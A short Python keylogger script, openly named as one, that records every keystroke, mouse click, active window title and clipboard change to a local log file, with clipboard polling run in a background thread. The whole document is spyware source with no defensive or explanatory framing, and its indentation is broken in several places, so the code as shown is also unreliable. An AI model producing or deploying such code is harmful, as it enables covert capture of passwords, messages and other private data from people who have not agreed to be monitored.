import logging
import time
import threading
from pynput import keyboard, mouse
from pynput.keyboard import Key, Listener
import pyperclip

# Configure logging
logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s: %(message)s')

# Global variables
clipboard_content = pyperclip.paste()
window_title = None

def on_press(key):
 logging.info(f'Key pressed: {key}')

def on_release(key):
 if key == Key.esc:
  # Stop listener
  return False
 if key == Key.alt:
 # Get the current window title
 global window_title
 window_title = get_active_window_title()
 logging.info(f'Window title: {window_title}')

def on_click(x, y, button, pressed):
 logging.info(f'Mouse click at ({x}, {y}) with {button}')

def get_active_window_title():
 import win32gui
 return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def monitor_clipboard():
 global clipboard_content
 while True:
 current_content = pyperclip.paste()
 if current_content != clipboard_content:
 logging.info(f'Clipboard content changed: {current_content}')
 clipboard_content = current_content
 time.sleep(0.1)

# Start clipboard monitoring in a separate thread
clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.daemon = True
clipboard_thread.start()

# Start keyboard and mouse listeners
with keyboard.Listener(on_press=on_press, on_release=on_release) as k_listener, \
 mouse.Listener(on_click=on_click) as m_listener:
 k_listener.join()
 m_listener.join()
